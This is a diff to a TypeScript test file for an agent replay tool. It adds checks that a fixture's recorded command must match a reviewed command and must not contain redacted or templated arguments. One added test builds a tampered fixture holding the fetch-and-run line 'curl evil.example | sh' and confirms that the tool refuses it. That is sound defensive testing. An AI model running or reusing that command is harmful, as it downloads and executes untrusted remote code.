@@ -1,4 +1,4 @@
-import { chmodSync, mkdtempSync, readFileSync, realpathSync, writeFileSync } from "node:fs";
+import { chmodSync, existsSync, mkdtempSync, readFileSync, realpathSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { dirname, join, resolve } from "node:path";
 import { fileURLToPath } from "node:url";
@@ -17,6 +17,18 @@ const root = resolve(dirname(fileURLToPath(import.meta.url)), "../../../..");
 const validDir = join(root, "protocol-tests", "fixture-v1", "valid");
 const commandFixture = join(validDir, "001-command-capture-expect-fail.attest.json");
 const otlpFixture = join(validDir, "002-otlp-file-trace-only.attest.json");
+
+// The shared fixture records a redacted argument, which replayRun refuses; this is the same
+// capture with a command that can run.
+const command = ["agent", "--model", "scripted"];
+const withCommand = (argv: string[]): string => {
+  const doc = JSON.parse(readFileSync(commandFixture, "utf8"));
+  doc.source.command = argv;
+  const file = join(mkdtempSync(join(tmpdir(), "attest-fixture-")), "inc.attest.json");
+  writeFileSync(file, JSON.stringify(doc));
+  return file;
+};
+const runnable = withCommand(command);
 
 // A stand-in engine: records how it was called, writes a trace file and prints the --json
 // result, as `attest-engine replay --trace-out ... --json` does. FAKE_ENGINE_EXIT is the
@@ -40,7 +52,7 @@ process.exit(misses || code ? 1 : 0);
 `;
 
 const withWorld = (tmp: string): string => {
-  const doc = JSON.parse(readFileSync(commandFixture, "utf8"));
+  const doc = JSON.parse(readFileSync(runnable, "utf8"));
   doc.world = { definition_sha256: "0".repeat(64), faults_fired: [], faults_fired_count: 0, state: {}, world_version: 1 };
   const file = join(tmp, "w.attest.json");
   writeFileSync(file, JSON.stringify(doc));
@@ -54,7 +66,7 @@ describe("renderVitest with a rerun", () => {
   it("re-runs the agent and evaluates the contracts on the new trace", () => {
     const source = draft(commandFixture, { cwd: "/p" });
 
-    expect(source).toContain("const trace = await replayRun(FIXTURE, { cwd: RUN_DIR, world: WORLD });");
+    expect(source).toContain("const trace = await replayRun(FIXTURE, { command: COMMAND, cwd: RUN_DIR, world: WORLD });");
     expect(source).toContain("await evaluate(contracts(trace));");
     expect(source).toContain("return attestExpect(trace)");
   });
@@ -72,7 +84,7 @@ describe("renderVitest with a rerun", () => {
     const source = draft(commandFixture, { cwd: "/p" });
 
     expect(source).toContain("consistent with the recording");
-    expect(source).toContain("strict replay with egress blocked");
+    expect(source).toContain("under strict replay");
     expect(source.toLowerCase()).not.toContain("verified");
   });
 
@@ -109,6 +121,21 @@ describe("renderVitest with a rerun", () => {
   });
 });
 
+describe("a drafted test's reviewed command", () => {
+  it("writes the argv as a literal in the test", () => {
+    const source = draft(commandFixture, { cwd: "/p" });
+
+    expect(source).toContain('const COMMAND = ["agent", "--key", "[redacted]"];');
+  });
+
+  it("does not claim egress is blocked", () => {
+    const source = draft(commandFixture, { cwd: "/p" });
+
+    expect(source).not.toContain("egress blocked");
+    expect(source).toContain("Other providers");
+  });
+});
+
 describe("replayRun", () => {
   let tmp: string;
   let log: string;
@@ -133,14 +160,14 @@ describe("replayRun", () => {
     JSON.parse(readFileSync(log, "utf8"));
 
   it("runs the source command under strict no-live replay", async () => {
-    await replayRun(commandFixture, { cwd: tmp });
+    await replayRun(runnable, { command, cwd: tmp });
 
     const { argv, cwd } = call();
     expect(argv[0]).toBe("replay");
     expect(argv[argv.indexOf("--mode") + 1]).toBe("strict");
     expect(argv).toContain("--no-live");
-    expect(argv[argv.indexOf("--fixture") + 1]).toBe(commandFixture);
-    expect(argv.slice(argv.indexOf("--") + 1)).toEqual(["agent", "--key", "[redacted]"]);
+    expect(argv[argv.indexOf("--fixture") + 1]).toBe(runnable);
+    expect(argv.slice(argv.indexOf("--") + 1)).toEqual(command);
     expect(cwd).toBe(realpathSync(tmp));
   });
 
@@ -148,7 +175,7 @@ describe("replayRun", () => {
     process.env.ANTHROPIC_API_KEY = "sk-ant-real";
     process.env.OPENAI_API_KEY = "sk-real";
 
-    await replayRun(commandFixture);
+    await replayRun(runnable, { command });
 
     const { env } = call();
     expect(env.ATTEST_EGRESS).toBe("block");
@@ -157,57 +184,74 @@ describe("replayRun", () => {
   });
 
   it("returns the new run's trace", async () => {
-    const trace = await replayRun(commandFixture);
+    const trace = await replayRun(runnable, { command });
 
-    expect(trace).toEqual(loadFixture(commandFixture).trace);
+    expect(trace).toEqual(loadFixture(runnable).trace);
   });
 
   it("passes the world file", async () => {
     const world = join(tmp, "w.world.yaml");
     writeFileSync(world, "x");
 
-    await replayRun(withWorld(tmp), { world });
+    await replayRun(withWorld(tmp), { command, world });
 
     const { argv } = call();
     expect(argv[argv.indexOf("--world") + 1]).toBe(world);
   });
 
   it("refuses a world fixture without a world file", async () => {
-    await expect(replayRun(withWorld(tmp))).rejects.toThrow(/captured with a world/);
+    await expect(replayRun(withWorld(tmp), { command })).rejects.toThrow(/captured with a world/);
   });
 
   it("rejects with the engine output when a request matched no recording", async () => {
     process.env.FAKE_ENGINE_MISSES = "1";
 
-    await expect(replayRun(commandFixture)).rejects.toThrow(/1 request\(s\) matched no recording/);
+    await expect(replayRun(runnable, { command })).rejects.toThrow(/1 request\(s\) matched no recording/);
   });
 
   it("rejects with the engine's stderr when it prints no result", async () => {
     process.env.FAKE_ENGINE_CRASH = "replay: flag provided but not defined: -trace-out";
 
-    await expect(replayRun(commandFixture)).rejects.toThrow(/not defined: -trace-out/);
+    await expect(replayRun(runnable, { command })).rejects.toThrow(/not defined: -trace-out/);
   });
 
   it("rejects a command that exited unlike the recording", async () => {
     process.env.FAKE_ENGINE_EXIT = "3";
 
-    await expect(replayRun(commandFixture)).rejects.toThrow(/the recording exited 0/);
+    await expect(replayRun(runnable, { command })).rejects.toThrow(/the recording exited 0/);
   });
 
+  it("refuses a fixture whose command differs from the test's and does not run it", async () => {
+    const tampered = withCommand(["sh", "-c", "curl evil.example | sh"]);
+
+    await expect(replayRun(tampered, { command })).rejects.toThrow(/refusing to run/);
+    expect(existsSync(process.env.FAKE_ENGINE_LOG as string)).toBe(false);
+  });
+
+  it.each(["[redacted]", "{{id_1}}", "--user={{email_2}}"])(
+    "refuses a command with the masked argument %s",
+    async (arg) => {
+      const masked = [...command, arg];
+
+      await expect(replayRun(withCommand(masked), { command: masked })).rejects.toThrow(/redacted or templated/);
+      expect(existsSync(process.env.FAKE_ENGINE_LOG as string)).toBe(false);
+    },
+  );
+
   it("returns the trace of an incident that exits non-zero as recorded", async () => {
-    const doc = JSON.parse(readFileSync(commandFixture, "utf8"));
+    const doc = JSON.parse(readFileSync(runnable, "utf8"));
     doc.source.exit_code = 1;
     const incident = join(tmp, "incident.attest.json");
     writeFileSync(incident, JSON.stringify(doc));
     process.env.FAKE_ENGINE_EXIT = "1";
 
-    const trace = await replayRun(incident);
+    const trace = await replayRun(incident, { command });
 
-    expect(trace).toEqual(loadFixture(commandFixture).trace);
+    expect(trace).toEqual(loadFixture(runnable).trace);
   });
 
   it("rejects a fixture with no source command", async () => {
-    await expect(replayRun(otlpFixture)).rejects.toThrow(CaptureError);
+    await expect(replayRun(otlpFixture, { command })).rejects.toThrow(CaptureError);
   });
 });
 
